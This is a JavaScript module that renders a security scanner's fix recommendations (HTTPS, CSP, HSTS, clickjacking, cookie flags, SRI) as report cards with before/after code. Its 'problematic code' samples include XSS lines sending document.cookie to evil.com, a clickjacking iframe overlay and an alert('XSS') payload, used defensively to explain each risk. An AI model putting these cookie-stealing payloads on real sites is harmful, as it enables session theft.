/**
 * Security Fixes Renderer - Professional Card-Based Recommendations
 * Generates detailed, actionable security fixes with code examples
 * Matches the Performance Fixes style for consistency
 */

/**
 * Translate security fix titles using i18n
 * Maps English titles to translation keys
 */
function translateSecurityFixTitle(englishTitle) {
  const titleMap = {
    'Mixed Content Detected': 'reports.security.fixTitles.mixedContent',
    'Excessive Inline Scripts': 'reports.security.fixTitles.excessiveInlineScripts',
    'Insecure Form Submission': 'reports.security.fixTitles.insecureFormSubmission',
    'Password Field Configuration': 'reports.security.fixTitles.passwordFieldConfig',
    'Unsandboxed Iframes': 'reports.security.fixTitles.unsandboxedIframes',
    'Implement HTTPS': 'reports.security.fixTitles.implementHttps',
    'Fix SSL/TLS Issues': 'reports.security.fixTitles.fixSslTlsIssues',
    'Implement Content Security Policy': 'reports.security.fixTitles.implementCsp',
    'Enable HTTP Strict Transport Security': 'reports.security.fixTitles.enableHsts',
    'Prevent Clickjacking Attacks': 'reports.security.fixTitles.preventClickjacking',
    'Prevent MIME Sniffing': 'reports.security.fixTitles.preventMimeSniffing',
    'Improve Cookie Security': 'reports.security.fixTitles.improveCookieSecurity',
    'Add Subresource Integrity Checks': 'reports.security.fixTitles.addSriChecks'
  };

  const key = titleMap[englishTitle];
  if (key) {
    return t(key, englishTitle);
  }
  return englishTitle;
}

/**
 * Translate OWASP references using i18n
 */
function translateOwaspRef(englishRef) {
  if (!englishRef) return '';

  const owaspMap = {
    'A1:2017 - Injection': 'reports.security.owaspRefs.a1Injection',
    'A2:2017 - Broken Authentication': 'reports.security.owaspRefs.a2BrokenAuth',
    'A3:2017 - Sensitive Data Exposure': 'reports.security.owaspRefs.a3DataExposure',
    'A5:2017 - Broken Access Control': 'reports.security.owaspRefs.a5BrokenAccess',
    'A6:2017 - Security Misconfiguration': 'reports.security.owaspRefs.a6Misconfig',
    'A7:2017 - Cross-Site Scripting (XSS)': 'reports.security.owaspRefs.a7Xss',
    'A9:2017 - Using Components with Known Vulnerabilities': 'reports.security.owaspRefs.a9KnownVulns'
  };

  const key = owaspMap[englishRef];
  if (key) {
    return t(key, englishRef);
  }
  return englishRef;
}

function renderSecurityFixes(recommendations, results) {
  const fixes = generateSecurityFixesData(recommendations, results);

  if (fixes.length === 0) {
    return `
      <div style="margin-top: 2rem; background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(16, 185, 129, 0.05)); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 16px; padding: 2rem;">
        <h3 style="margin: 0 0 1rem 0; display: flex; align-items: center; gap: 0.5rem; color: #22c55e;">
          <span style="font-size: 1.5rem;">🛡️</span> ${t('reports.security.securityFixes.excellent', 'Excellent! Your Site is Secure')}
        </h3>
        <p style="color: #86efac; margin: 0;">${t('reports.security.securityFixes.excellentDescription', 'All security checks passed. Your site follows industry best practices for SSL, headers, and vulnerability prevention.')}</p>
      </div>
    `;
  }

  // Group by severity
  const critical = fixes.filter(f => f.severity === 'critical');
  const high = fixes.filter(f => f.severity === 'high');
  const medium = fixes.filter(f => f.severity === 'medium');
  const low = fixes.filter(f => f.severity === 'low');

  let html = `
    <div class="security-fixes-container" style="margin-top: 2rem;">
      <h3 style="margin: 0 0 1.5rem 0; display: flex; align-items: center; gap: 0.5rem; font-size: 1.35rem;">
        <span style="font-size: 1.75rem;">🔒</span> ${t('reports.security.securityFixes.title', 'Security Fixes')}
        <span style="font-size: 0.875rem; color: #888; font-weight: normal;">(${t('reports.security.securityFixes.issuesFound', '{{count}} issues found').replace('{{count}}', fixes.length)})</span>
      </h3>
      <div class="fixes-container">
  `;

  // Render critical fixes
  if (critical.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    critical.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, index);
    });
    html += `</div>`;
  }

  // Render high priority fixes
  if (high.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    high.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + index);
    });
    html += `</div>`;
  }

  // Render medium priority fixes
  if (medium.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    medium.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + high.length + index);
    });
    html += `</div>`;
  }

  // Render low priority fixes
  if (low.length > 0) {
    html += `<div class="severity-group">`;
    low.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + high.length + medium.length + index);
    });
    html += `</div>`;
  }

  html += `</div></div>`;

  return html;
}

function generateSecurityFixesData(recommendations, results) {
  const fixes = [];

  // Process each recommendation from the security analyzer
  if (recommendations && recommendations.length > 0) {
    recommendations.forEach(rec => {
      // Skip string entries (from error fallback like "Security analysis failed: ...")
      if (typeof rec === 'string') return;
      if (!rec || !rec.title) return;
      try {
        const fixData = createSecurityFix(rec, results);
        if (fixData) {
          fixes.push(fixData);
        }
      } catch (err) {
        console.warn('[SecurityFixes] Failed to process recommendation:', rec.title, err);
      }
    });
  }

  // Sort by severity
  const priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
  fixes.sort((a, b) => priorityOrder[a.severity] - priorityOrder[b.severity]);

  return fixes;
}

// Helper function to get translated steps for security fixes
function getTranslatedSteps(fixKey, defaultSteps) {
  // Try to get translated steps from i18n
  const translatedSteps = t(`reports.security.securityFixes.${fixKey}.steps`, null);
  if (translatedSteps && Array.isArray(translatedSteps)) {
    return translatedSteps;
  }
  // Return default English steps as fallback
  return defaultSteps;
}

// eslint-disable-next-line no-unused-vars
function createSecurityFix(rec, results) {
  // results parameter reserved for future dynamic content based on scan results
  // Map recommendation to detailed fix with code examples
  const fixTemplates = {
    'Implement HTTPS': {
      icon: '🔴',
      location: t('reports.security.securityFixes.location.webServer', 'Web Server Config / Hosting Provider'),
      category: t('reports.security.securityFixes.sslTls', 'SSL/TLS'),
      impact: t('reports.security.securityFixes.implementHttps.impact', '+30 Security Score'),
      summary: t('reports.security.securityFixes.implementHttps.summary', 'Your website is not using HTTPS encryption, which means all data transmitted between your server and visitors is sent in plain text. This includes passwords, personal information, payment details, and session tokens, all of which can be intercepted by attackers on the same network through man-in-the-middle attacks. Modern browsers display a prominent "Not Secure" warning in the address bar for HTTP sites, which erodes visitor trust and increases bounce rates. Google also uses HTTPS as a ranking signal, so unencrypted sites face a measurable SEO penalty. Free SSL certificates are available through Let\'s Encrypt, making HTTPS implementation straightforward for any website.'),
      problematicCode: `<!-- Current insecure setup -->
<a href="http://example.com/login">Login</a>

<!-- Server configuration (Apache) -->
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/html
</VirtualHost>

<!-- Issues: -->
<!-- ✗ Data transmitted in plain text -->
<!-- ✗ Vulnerable to man-in-the-middle attacks -->
<!-- ✗ Browser shows "Not Secure" warning -->
<!-- ✗ SEO penalty from Google -->`,
      fixedCode: `<!-- Secure HTTPS setup -->
<a href="https://example.com/login">Login</a>

<!-- Server configuration (Apache) -->
<VirtualHost *:443>
    ServerName example.com
    DocumentRoot /var/www/html
    
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/example.com.key
    SSLCertificateChainFile /etc/ssl/certs/chain.crt
    
    # Modern SSL configuration
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:...
</VirtualHost>

<!-- Redirect HTTP to HTTPS -->
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<!-- ✓ All traffic encrypted -->
<!-- ✓ Modern TLS protocols only -->
<!-- ✓ Automatic HTTP→HTTPS redirect -->`,
      steps: getTranslatedSteps('implementHttps', [
        'Get a free SSL certificate from Let\'s Encrypt using certbot',
        'Install the certificate and configure your web server',
        'Set up automatic HTTP → HTTPS redirect'
      ])
    },
    'Implement Content Security Policy': {
      icon: '🔴',
      location: t('reports.security.securityFixes.location.serverHeaders', 'Web Server Config (Response Headers)'),
      category: t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
      impact: t('reports.security.securityFixes.implementCsp.impact', '+15 Security Score'),
      summary: t('reports.security.securityFixes.implementCsp.summary', 'Your site lacks a Content Security Policy (CSP) header, leaving it vulnerable to Cross-Site Scripting (XSS) attacks. CSP is an HTTP response header that tells the browser exactly which sources of content (scripts, styles, images, fonts) are allowed to load on your page. Without it, attackers who find an injection point can execute arbitrary JavaScript that steals user cookies, redirects visitors to phishing pages, or silently records keystrokes. XSS is consistently ranked among the top web security vulnerabilities by OWASP and is one of the most commonly exploited attack vectors. Implementing even a basic CSP dramatically reduces your attack surface and provides a strong defense-in-depth layer against script injection.'),
      problematicCode: `<!-- No CSP - Vulnerable to XSS -->
<script>
  // Attacker can inject:
  document.write('<img src="https://evil.com/steal?cookie=' + document.cookie + '">');
</script>

<!-- Inline scripts and eval() allowed -->
<button onclick="eval(userInput)">Submit</button>

<!-- External scripts from any source -->
<script src="https://random-cdn.com/malware.js"></script>

<!-- Issues: -->
<!-- ✗ Any script can execute -->
<!-- ✗ Inline event handlers allowed -->
<!-- ✗ eval() and similar functions enabled -->
<!-- ✗ No control over resource origins -->`,
      fixedCode: `<!-- Server header configuration -->
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

<!-- HTML with nonce-based scripts -->
<script nonce="abc123">
  // Only scripts with valid nonce execute
  initializeApp();
</script>

<!-- Meta tag alternative -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">

<!-- ✓ Only trusted scripts execute -->
<!-- ✓ Inline scripts require nonce -->
<!-- ✓ Resource origins controlled -->`,
      steps: getTranslatedSteps('implementCsp', [
        'Start with <code>Content-Security-Policy-Report-Only</code> header to find issues',
        'Set <code>default-src \'self\'; script-src \'self\'</code> as your base policy',
        'Replace inline scripts/styles with external files or add nonces',
        'Switch to enforcing <code>Content-Security-Policy</code> header'
      ])
    },
    'Enable HTTP Strict Transport Security': {
      icon: '🟠',
      location: t('reports.security.securityFixes.location.serverHeaders', 'Web Server Config (Response Headers)'),
      category: t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
      impact: t('reports.security.securityFixes.enableHsts.impact', '+10 Security Score'),
      summary: t('reports.security.securityFixes.enableHsts.summary', 'HSTS header is not configured, leaving your site vulnerable to protocol downgrade attacks. When a user types your domain without the "https://" prefix, the browser initially connects over plain HTTP before being redirected to HTTPS. During that brief unencrypted request, an attacker on the same network can intercept the connection and prevent the redirect to HTTPS entirely, a technique known as SSL stripping. The HSTS header tells browsers to always use HTTPS for your domain, eliminating that initial insecure request completely. Once set, the browser remembers this preference for the specified duration and refuses to connect over HTTP, even if the user explicitly types it.'),
      problematicCode: `<!-- Without HSTS -->
<!-- User types: example.com -->
<!-- Browser connects via HTTP first -->
<!-- Attacker intercepts and blocks HTTPS redirect -->

<!-- Response headers (missing HSTS): -->
HTTP/1.1 301 Moved Permanently
Location: https://example.com/

<!-- Issues: -->
<!-- ✗ First request is always HTTP -->
<!-- ✗ Vulnerable to SSL stripping attacks -->
<!-- ✗ No browser enforcement of HTTPS -->`,
      fixedCode: `<!-- With HSTS enabled -->
<!-- Server response headers: -->
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

<!-- Apache configuration -->
<VirtualHost *:443>
    Header always set Strict-Transport-Security \\
        "max-age=31536000; includeSubDomains; preload"
</VirtualHost>

<!-- Nginx configuration -->
server {
    listen 443 ssl;
    add_header Strict-Transport-Security 
        "max-age=31536000; includeSubDomains; preload" always;
}

<!-- ✓ Browser remembers HTTPS requirement -->
<!-- ✓ Automatic HTTPS for 1 year -->
<!-- ✓ All subdomains protected -->`,
      steps: getTranslatedSteps('enableHsts', [
        'Verify HTTPS works on all pages first',
        'Add <code>Strict-Transport-Security: max-age=300</code> and test',
        'Increase to <code>max-age=31536000; includeSubDomains</code> after testing'
      ])
    },
    'Prevent Clickjacking Attacks': {
      icon: '🟡',
      location: t('reports.security.securityFixes.location.serverHeaders', 'Web Server Config (Response Headers)'),
      category: t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
      impact: t('reports.security.securityFixes.preventClickjacking.impact', '+5 Security Score'),
      summary: t('reports.security.securityFixes.preventClickjacking.summary', 'X-Frame-Options header is not set, leaving your site vulnerable to clickjacking attacks. In a clickjacking attack, a malicious website loads your page inside an invisible iframe and overlays deceptive content on top, tricking users into clicking buttons on your site without realizing it. This can lead to unauthorized actions such as changing account settings, making purchases, or granting permissions to an attacker\'s application. The attack is particularly dangerous because the user believes they are interacting with the malicious page while they are actually performing actions on your site with their authenticated session. Adding the X-Frame-Options header or using the CSP frame-ancestors directive prevents your pages from being embedded in third-party frames entirely.'),
      problematicCode: `<!-- Without X-Frame-Options -->
<!-- Attacker's malicious page: -->
<style>
  iframe { opacity: 0; position: absolute; }
  .fake-button { position: absolute; z-index: 1; }
</style>

<button class="fake-button">Win a Prize!</button>
<iframe src="https://yoursite.com/settings/delete-account"></iframe>

<!-- User clicks "Win a Prize" but actually clicks -->
<!-- the invisible "Delete Account" button -->

<!-- Issues: -->
<!-- ✗ Site can be embedded in any iframe -->
<!-- ✗ Clickjacking attacks possible -->
<!-- ✗ User actions can be hijacked -->`,
      fixedCode: `<!-- With X-Frame-Options -->
<!-- Server response headers: -->
X-Frame-Options: DENY
<!-- or -->
X-Frame-Options: SAMEORIGIN

<!-- Apache configuration -->
Header always set X-Frame-Options "DENY"

<!-- Nginx configuration -->
add_header X-Frame-Options "DENY" always;

<!-- Modern CSP alternative (recommended) -->
Content-Security-Policy: frame-ancestors 'none';
<!-- or for same-origin only: -->
Content-Security-Policy: frame-ancestors 'self';

<!-- ✓ Site cannot be embedded in iframes -->
<!-- ✓ Clickjacking attacks prevented -->
<!-- ✓ CSP provides more granular control -->`,
      steps: getTranslatedSteps('preventClickjacking', [
        'Add header: <code>X-Frame-Options: DENY</code> to your server config',
        'Also add CSP: <code>frame-ancestors \'none\'</code> for modern browsers'
      ])
    },
    'Prevent MIME Sniffing': {
      icon: '🟡',
      location: t('reports.security.securityFixes.location.serverHeaders', 'Web Server Config (Response Headers)'),
      category: t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
      impact: t('reports.security.securityFixes.preventMimeSniffing.impact', '+5 Security Score'),
      summary: t('reports.security.securityFixes.preventMimeSniffing.summary', 'X-Content-Type-Options header is missing, which allows browsers to override the declared content type and guess what a file actually contains. This behavior, known as MIME sniffing, means a file served as text/plain could be re-interpreted and executed as HTML or JavaScript if the browser detects script-like content inside it. Attackers exploit this by uploading files with harmless extensions (such as .txt or .jpg) that contain malicious scripts, which the browser then executes in the context of your domain. This single-line header (X-Content-Type-Options: nosniff) forces the browser to strictly respect the Content-Type you declare, blocking any attempts to execute mistyped files. It is one of the easiest security headers to implement and has no negative impact on normal site functionality.'),
      problematicCode: `<!-- Without X-Content-Type-Options -->
<!-- Attacker uploads malicious.txt containing: -->
<script>alert('XSS')</script>

<!-- Server responds with: -->
Content-Type: text/plain

<!-- But browser "sniffs" content and might execute as HTML/JS -->
<!-- if it detects script-like content -->

<!-- Issues: -->
<!-- ✗ Browser may ignore Content-Type -->
<!-- ✗ Text files could execute as scripts -->
<!-- ✗ Uploads become security risks -->`,
      fixedCode: `<!-- With X-Content-Type-Options -->
<!-- Server response headers: -->
X-Content-Type-Options: nosniff

<!-- Apache configuration -->
Header always set X-Content-Type-Options "nosniff"

<!-- Nginx configuration -->
add_header X-Content-Type-Options "nosniff" always;

<!-- Express.js -->
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

<!-- ✓ Browser strictly follows Content-Type -->
<!-- ✓ No MIME sniffing vulnerabilities -->
<!-- ✓ Uploaded files stay as declared type -->`,
      steps: getTranslatedSteps('preventMimeSniffing', [
        'Add header: <code>X-Content-Type-Options: nosniff</code> to all responses',
        'Ensure your server sends correct Content-Type for all files',
        'Test file downloads and uploads work correctly after implementation'
      ])
    },
    'Improve Cookie Security': {
      icon: '🟠',
      location: t('reports.security.securityFixes.location.appCode', 'Application Code (Server-Side)'),
      category: t('reports.security.securityFixes.cookies', 'Cookies'),
      impact: t('reports.security.securityFixes.improveCookieSecurity.impact', '+10 Security Score'),
      summary: t('reports.security.securityFixes.improveCookieSecurity.summary', 'Cookies are not properly secured, putting user sessions and sensitive data at risk. Without the HttpOnly flag, JavaScript code running on the page—including injected malicious scripts—can read session cookies and send them to an attacker, enabling complete account takeover. Without the Secure flag, cookies are transmitted over unencrypted HTTP connections where they can be intercepted on public Wi-Fi or compromised networks. The SameSite attribute prevents cross-site request forgery (CSRF) attacks by controlling whether the browser sends cookies with requests originating from other websites. Setting all three flags on your session cookies closes the most common cookie-related attack vectors with minimal implementation effort.'),
      problematicCode: `<!-- Insecure cookie settings -->
Set-Cookie: session=abc123

<!-- JavaScript can access cookies -->
<script>
  // Attacker steals session via XSS:
  new Image().src = 'https://evil.com/steal?c=' + document.cookie;
</script>

<!-- Cookie sent over HTTP -->
<!-- Cookie sent with cross-site requests -->

<!-- Issues: -->
<!-- ✗ No HttpOnly - accessible via JavaScript -->
<!-- ✗ No Secure - sent over HTTP -->
<!-- ✗ No SameSite - CSRF vulnerable -->`,
      fixedCode: `<!-- Secure cookie settings -->
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

<!-- Express.js session configuration -->
app.use(session({
  cookie: {
    httpOnly: true,    // Blocks JavaScript access
    secure: true,      // HTTPS only
    sameSite: 'strict', // No cross-site sending
    maxAge: 3600000    // 1 hour expiry
  }
}));

<!-- PHP configuration -->
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict

<!-- ✓ Protected from XSS cookie theft -->
<!-- ✓ Only sent over HTTPS -->
<!-- ✓ CSRF attacks prevented -->`,
      steps: getTranslatedSteps('improveCookieSecurity', [
        'Add <code>HttpOnly; Secure; SameSite=Lax</code> flags to all session cookies',
        'Update your session library or framework configuration',
        'Test login/logout functionality still works'
      ])
    },
    'Add Subresource Integrity': {
      icon: '🟡',
      location: t('reports.security.securityFixes.location.htmlSource', 'HTML Source Code (Webpage)'),
      category: t('reports.security.securityFixes.thirdPartyScripts', 'Third-Party Scripts'),
      impact: t('reports.security.securityFixes.addSri.impact', '+8 Security Score'),
      summary: t('reports.security.securityFixes.addSri.summary', 'Third-party scripts and stylesheets are loaded without integrity verification, creating a supply chain vulnerability. If the CDN or external server hosting these files is compromised, an attacker could replace the legitimate file with malicious code that executes on every page load for all of your visitors. Subresource Integrity (SRI) adds a cryptographic hash to each external resource tag, and the browser verifies the downloaded file matches that hash before executing it. If the file has been tampered with, the browser blocks it entirely, preventing the compromised code from running. This protection is especially critical for widely-used libraries like jQuery or Bootstrap, which are high-value targets for supply chain attacks.'),
      problematicCode: `<!-- Loading external scripts without SRI -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.example.com/bootstrap.min.css" rel="stylesheet">

<!-- If CDN is compromised, malicious code executes -->
<!-- No way to verify file hasn't been modified -->

<!-- Issues: -->
<!-- ✗ No integrity verification -->
<!-- ✗ CDN compromise affects your site -->
<!-- ✗ Supply chain attack vulnerability -->`,
      fixedCode: `<!-- With Subresource Integrity (SRI) -->
<script 
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
  crossorigin="anonymous">
</script>

<link 
  href="https://cdn.example.com/bootstrap.min.css"
  rel="stylesheet"
  integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
  crossorigin="anonymous">

<!-- Generate SRI hash: -->
<!-- openssl dgst -sha384 -binary FILE | openssl base64 -A -->

<!-- ✓ Browser verifies file integrity -->
<!-- ✓ Modified files are blocked -->
<!-- ✓ Supply chain attacks prevented -->`,
      steps: getTranslatedSteps('addSri', [
        'Generate SRI hashes at srihash.org for each external script/stylesheet',
        'Add <code>integrity</code> and <code>crossorigin="anonymous"</code> attributes',
        'Update hashes whenever you upgrade library versions'
      ])
    }
  };

  // Find matching template or create generic one
  let template = null;
  for (const [key, value] of Object.entries(fixTemplates)) {
    if (rec.title.toLowerCase().includes(key.toLowerCase()) || 
        key.toLowerCase().includes(rec.title.toLowerCase().split(' ').slice(0, 3).join(' '))) {
      template = value;
      break;
    }
  }

  // If no specific template, create a generic one
  if (!template) {
    template = createGenericSecurityFix(rec);
  }

  return {
    id: `security-${rec.title.toLowerCase().replace(/[^a-z0-9]/g, '-')}`,
    severity: rec.priority || 'medium',
    icon: template.icon || (rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : '🟡'),
    title: escapeSecurityHtml(translateSecurityFixTitle(rec.title)),
    subtitle: escapeSecurityHtml(translateOwaspRef(rec.owaspRef)) || t('reports.security.securityFixes.securityBestPractice', 'Security Best Practice'),
    category: template.category || t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
    location: template.location || t('reports.security.securityFixes.location.serverConfig', 'Server Configuration'),
    impact: template.impact || '+5 ' + t('reports.security.securityFixes.securityScore', 'Security Score'),
    summary: template.summary || escapeSecurityHtml(rec.description),
    problematicCode: template.problematicCode || `<!-- Current issue -->\n${rec.description}`,
    fixedCode: template.fixedCode || `<!-- Recommended fix -->\n${rec.solution || 'Implement security best practices'}`,
    resources: rec.resources || [],
    steps: template.steps || [escapeSecurityHtml(rec.solution) || 'Follow security best practices'],
    proSteps: template.proSteps || []
  };
}

function createGenericSecurityFix(rec) {
  const genericSteps = t('reports.security.securityFixes.genericSteps', null);
  return {
    icon: rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : '🟡',
    category: t('reports.security.securityFixes.securityHeaders', 'Security Headers'),
    impact: rec.priority === 'critical' ? '+15 ' + t('reports.security.securityFixes.securityScore', 'Security Score') : rec.priority === 'high' ? '+10 ' + t('reports.security.securityFixes.securityScore', 'Security Score') : '+5 ' + t('reports.security.securityFixes.securityScore', 'Security Score'),
    summary: escapeSecurityHtml(rec.description) || t('reports.security.securityFixes.genericIssueDescription', 'A security issue was detected that needs attention.'),
    problematicCode: `<!-- ${t('reports.security.securityFixes.currentIssue', 'Current Issue')} -->
<!-- ${rec.title} -->

${rec.description || t('reports.security.securityFixes.issueDetailsNotAvailable', 'Issue details not available')}

<!-- ${t('reports.security.securityFixes.impact', 'Impact')}: -->
<!-- ${rec.impact || t('reports.security.securityFixes.mayAffectSecurity', 'May affect site security')} -->`,
    fixedCode: `<!-- ${t('reports.security.securityFixes.secureSolution', 'Secure Solution')} -->
<!-- ${rec.title} -->

${rec.solution || t('reports.security.securityFixes.implementRecommended', 'Implement the recommended security measures')}

<!-- ${t('reports.security.securityFixes.benefits', 'Benefits')}: -->
<!-- ✓ ${t('reports.security.securityFixes.improvedPosture', 'Improved security posture')} -->
<!-- ✓ ${t('reports.security.securityFixes.reducedAttackSurface', 'Reduced attack surface')} -->
<!-- ✓ ${t('reports.security.securityFixes.industryBestPractices', 'Industry best practices')} -->`,
    steps: genericSteps && Array.isArray(genericSteps) ? genericSteps : [
      escapeSecurityHtml(rec.solution) || t('reports.security.securityFixes.reviewAndImplement', 'Review and implement security recommendations'),
      t('reports.security.securityFixes.testInStaging', 'Test changes in a staging environment first'),
      t('reports.security.securityFixes.deployAndVerify', 'Deploy to production and verify the fix')
    ]
  };
}

function renderSecurityFixAccordion(fix, index) {
  const accordionId = `secfix-${fix.id}-${index}`;
  const severityClass = `severity-${escapeSecurityHtml(fix.severity)}`;

  return `
    <div class="fix-accordion ${severityClass}" data-fix-id="${accordionId}">
      <div class="fix-header" data-action="toggle-security-accordion" data-accordion-id="${accordionId}">
        <div class="fix-header-left">
          <span class="fix-icon">${fix.icon}</span>
          <div class="fix-title-group">
            <h4 class="fix-title">${fix.title}</h4>
            <p class="fix-subtitle">${fix.subtitle}</p>
          </div>
        </div>
        <div class="fix-badges">
          <span class="fix-badge priority-${escapeSecurityHtml(fix.severity)}">${escapeSecurityHtml(fix.severity.toUpperCase())}</span>
          <span class="fix-badge category">${fix.category}</span>
          <span class="fix-badge location">${fix.location}</span>
          <span class="fix-expand-icon">▼</span>
        </div>
      </div>

      <div class="fix-content" id="${accordionId}-content">
        <div class="fix-content-inner">
          ${renderSecurityFixTabs(fix, accordionId)}
        </div>
      </div>
    </div>
  `;
}

function renderSecurityFixTabs(fix, accordionId) {
  return `
    <div class="fix-tabs">
      <button class="fix-tab active" data-action="switch-security-tab" data-accordion-id="${accordionId}" data-tab="summary">
        📋 ${t('reports.security.securityFixes.tabSummary', 'Summary')}
      </button>
      <button class="fix-tab" data-action="switch-security-tab" data-accordion-id="${accordionId}" data-tab="code">
        💻 ${t('reports.security.securityFixes.tabCode', 'Code')}
      </button>
      ${fix.resources && fix.resources.length > 0 ? `<button class="fix-tab" data-action="switch-security-tab" data-accordion-id="${accordionId}" data-tab="resources">📚 ${t('reports.security.securityFixes.tabResources', 'Resources')}</button>` : ''}
      <button class="fix-tab" data-action="switch-security-tab" data-accordion-id="${accordionId}" data-tab="guide">
        🔧 ${t('reports.security.securityFixes.tabFixGuide', 'Fix Guide')}
      </button>
    </div>

    <!-- Summary Tab -->
    <div class="fix-tab-content active" id="${accordionId}-summary">
      <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1rem; padding: 0.625rem 0.875rem; background: rgba(99, 102, 241, 0.08); border: 1px solid rgba(99, 102, 241, 0.2); border-radius: 8px;">
        <span style="font-size: 1rem;">📍</span>
        <span style="font-size: 0.8rem; color: var(--r-text-muted, #6B7280); font-weight: 500;">${t('reports.security.securityFixes.whereToFix', 'Where to fix')}:</span>
        <span style="font-size: 0.85rem; color: var(--r-text, #111827); font-weight: 600;">${fix.location}</span>
      </div>
      <p style="color: var(--r-text-muted, #6B7280); line-height: 1.7; margin-bottom: 1rem;">
        ${fix.summary}
      </p>
      <div class="impact-indicator">
        <div>
          <div class="impact-value">${fix.impact}</div>
          <div class="impact-label">${t('reports.security.securityFixes.estimatedImprovement', 'Estimated Improvement')}</div>
        </div>
      </div>
    </div>

    <!-- Code Tab -->
    <div class="fix-tab-content" id="${accordionId}-code">
      <div class="code-comparison">
        <div class="code-block">
          <div class="code-block-header">
            <span class="code-block-title error">
              ❌ ${t('reports.security.securityFixes.currentIssue', 'Current Issue')}
            </span>
            <button class="fix-btn-secondary" style="padding: 0.375rem 0.75rem; font-size: 0.75rem;" data-action="copy-security-code" data-code-id="${accordionId}-problem">
              📋 ${t('reports.security.securityFixes.copy', 'Copy')}
            </button>
          </div>
          <div class="code-block-body">
            <pre id="${accordionId}-problem">${escapeSecurityHtml(fix.problematicCode)}</pre>
          </div>
        </div>

        <div class="code-block" style="position: relative;">
          <div class="code-block-header">
            <span class="code-block-title success">
              ✅ ${t('reports.security.securityFixes.secureSolution', 'Secure Solution')}
            </span>
            <button class="fix-btn-secondary" style="padding: 0.375rem 0.75rem; font-size: 0.75rem;" data-action="copy-security-code" data-code-id="${accordionId}-solution">
              📋 ${t('reports.security.securityFixes.copy', 'Copy')}
            </button>
          </div>
          <div class="code-block-body">
            <pre id="${accordionId}-solution">${escapeSecurityHtml(fix.fixedCode)}</pre>
          </div>
        </div>
      </div>
    </div>

    ${fix.resources && fix.resources.length > 0 ? `
    <!-- Resources Tab -->
    <div class="fix-tab-content" id="${accordionId}-resources">
      <h5 style="margin: 0 0 1rem 0; color: #fff;">${t('reports.security.securityFixes.learnMore', 'Learn More')}:</h5>
      <ul class="resources-list" style="list-style: none; padding: 0; margin: 0;">
        ${fix.resources.map(r => `
          <li style="margin-bottom: 0.75rem;">
            <a href="${escapeSecurityHtml(r.url)}" target="_blank" rel="noopener noreferrer"
               style="color: var(--accent-primary); text-decoration: none; display: flex; align-items: center; gap: 0.5rem;">
              <span>📄</span>
              <span>${escapeSecurityHtml(r.title)}</span>
              <span style="font-size: 0.75rem; opacity: 0.7;">↗</span>
            </a>
          </li>
        `).join('')}
      </ul>
    </div>
    ` : ''}

    <!-- Fix Guide Tab -->
    <div class="fix-tab-content" id="${accordionId}-guide">
      <h5 style="margin: 0 0 1rem 0; color: #fff;">${t('reports.security.securityFixes.stepByStepFix', 'Step-by-Step Fix')}:</h5>
      <ol style="margin: 0; padding-left: 1.5rem; color: #ccc; line-height: 1.8;">
        ${[...fix.steps, ...(fix.proSteps || [])].map(step => `<li style="margin-bottom: 0.75rem;">${step}</li>`).join('')}
      </ol>

      <div class="fix-actions" style="margin-top: 1.5rem; display: flex; gap: 0.75rem; flex-wrap: wrap;">
        <a href="${getSecurityDocsUrl(fix.category, fix.title)}" target="_blank" rel="noopener noreferrer" class="fix-btn fix-btn-primary" style="padding: 0.625rem 1.25rem; background: var(--accent-primary); color: #000; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem;">
          📚 ${t('reports.security.securityFixes.learnMore', 'Learn More')}
        </a>
        <a href="https://securityheaders.com/" target="_blank" rel="noopener noreferrer" class="fix-btn fix-btn-secondary" style="padding: 0.625rem 1.25rem; background: transparent; border: 1px solid rgba(255,255,255,0.2); color: #ccc; border-radius: 6px; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem;">
          🧪 ${t('reports.security.securityFixes.testYourHeaders', 'Test Your Headers')}
        </a>
      </div>
    </div>
  `;
}

